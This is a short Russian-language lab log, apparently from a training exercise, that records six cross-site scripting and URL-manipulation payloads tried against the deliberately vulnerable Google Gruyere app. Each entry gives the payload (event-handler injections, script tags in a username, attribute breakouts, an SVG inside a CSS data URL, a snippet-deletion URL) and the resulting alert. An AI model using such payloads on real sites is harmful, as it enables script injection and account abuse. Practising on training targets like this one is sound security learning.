# Ля ля е коко джомбо

## Payload 1

`https://google-gruyere.appspot.com/481645647050420153731399784541443008317/%3Cbody%20onload=alert(/lollololo/.source)%3E` <br>
Вставил `<body onload=alert(/XSS/.source)>` в url, вылез алерт с текстом "lollololo"

## Payload 2

`(1') <a ONMOUSEOVER="alert(1)" href="#">read this!</a>`<br>
Вставил в поле добавления сниппета, при наведении вылез алерт "1"

## Payload 3

`deletesnippet?index=0`<br>
Вставил в url и кароче "index=номер" обозначает, какой сниппет удалить

## Payload 4

`https://google-gruyere.appspot.com/465348762713896480568835336007440892404/background-image:%20url(%22data:image/jpg;base64,%3C//style%3E%3Csvg/onload=alert(document.domain)%3E%22);%20background-color:%20#cccccc;`

Вставил `background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>"); background-color: #cccccc;` в url и вылезла 404 ошибка с алертом

## Payload 5

Убрал `maxleght=16` у поля логин при регистраци, зарегал юзера с логином `<script>alert('попа')</script>` и вошёл в аккаунт. Вылез этот алерт.

## Payload 6

Вставил `red'onmouseover='alert(1)` в цвет в профиле, алерт выводится при наведении мышки
